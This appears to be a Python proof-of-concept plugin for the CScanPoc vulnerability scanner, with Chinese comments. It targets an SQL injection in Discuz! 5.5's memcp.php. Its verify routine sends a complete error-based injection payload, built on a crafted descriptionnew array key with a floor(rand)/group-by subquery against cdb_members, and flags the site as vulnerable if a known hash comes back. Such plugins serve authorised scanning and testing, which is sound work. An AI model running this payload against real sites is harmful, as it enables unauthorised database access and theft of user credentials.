# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Discuz_0041_L'  # 平台漏洞编号，留空
    name = 'Discuz 5.5 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-06-18'  # 漏洞公布时间
    desc = '''
        漏洞文件：memcp.php
        if(is_array($descriptionnew)) { //问题出在这里 $descriptionnew未被初始化 discuz会初始时注册变量, 当我们提交 http://localhost/discuz/memcp.php?action=buddylist&descriptionnew[123']=1 的时候 注册了$descriptionnew 变量
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3241/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = '5.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'acd441ca-933c-4ef1-ad28-0c703e439f67'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 首先注册用户。
            # 获取cookies
            cookies = {}
            '''
            raw_cookies = 'bid=xxxxx;_pk_ref.100001.8cb4=xxxxxxx;__utma=xxxxx'
            for line in raw_cookies.split(';'):  
                key,value=line.split('=',1)#1代表只分一次，得到两个数据  
                cookies[key]=value 
            '''
            payload = "/memcp.php?action=buddylist&descriptionnew[' and(select 1 from(select count(*),concat((select(select concat(0x7c,username,0x7c,md5(c),0x7c) from cdb_members limit 0,1) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23]=1"
            data = "formhash=698a7245&buddysubmit=%E6%8F%90+%C2%A0+%E4%BA%A4"
            url = self.target + payload
            r = requests.post(url, cookies=cookies, data=data)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
